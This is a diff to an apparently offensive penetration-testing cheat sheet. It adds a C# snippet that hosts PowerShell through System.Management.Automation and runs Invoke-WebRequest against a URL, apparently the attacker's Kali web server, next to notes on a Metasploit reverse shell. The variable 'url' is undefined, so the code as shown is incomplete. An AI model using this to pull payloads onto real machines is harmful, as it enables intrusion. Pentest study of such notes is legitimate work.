@@ -50,6 +50,28 @@ Run on Kali:
 sudo python3 -m http.server 80
 ```
 
+Run any powershell command (this will also create .dll files that need to be in the directory the exploit is running)
+```
+using System;  
+using System.Management.Automation;
+
+class Program  
+{  
+    static void Main()  
+    {  
+        using (PowerShell ps = PowerShell.Create())  
+        {  
+
+            // Build the PowerShell command  
+            string command = $"Invoke-WebRequest -Uri '{url}'";
+
+            // Add and invoke the PowerShell command  
+            ps.AddScript(command);  
+            ps.Invoke();  
+        }  
+    }  
+}
+```
 
 ### Metasploit Reverse Shell
 
